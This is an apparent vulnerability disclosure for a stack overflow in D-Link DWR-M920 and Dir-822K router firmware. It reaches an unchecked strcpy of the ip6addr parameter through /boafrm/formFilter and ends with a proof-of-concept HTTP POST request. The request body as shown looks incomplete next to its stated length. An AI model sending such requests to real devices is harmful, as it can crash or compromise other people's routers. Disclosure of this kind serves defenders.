### Overview
vendor: D-Link

product: DWR-M920/Dir-822K

version: V1.1.50/20250513164613

type: Stack Overflow
### Vulnerability Description
A vulnerability has been found in D-Link DWR-M920 V1.1.50 and Dir-822K 20250513164613. This vulnerability can be triggered through the route /boafrm/formFilter. The manipulation of the argument ip6addr leads to stack overflow. The attack is possible to be carried out remotely. The exploit has been disclosed to the public and may be used.

### Vulnerability Details
The `sub_42261C` function retrieves the `ip6addr` parameter from the user request. The parameter is passed to the `strcpy` function without any length check, which may overflow the stack-based buffer `v79`.

![](./images/4.png)

### Reproduction
First, visit `http://192.168.0.1/urlfilter.htm` ，send the `poc` to trigger the crash.

### POC
```
POST /boafrm/formFilter HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 4123
Origin: http://192.168.0.1
Connection: keep-alive
Referer: http://192.168.0.1/portfilter6.htm
Cookie: webuicookie=HpoYi1zK9yrYjIplTcJ6NKus
Upgrade-Insecure-Requests: 1
Priority: u=4

addFilterIp=1&ip=1&
```
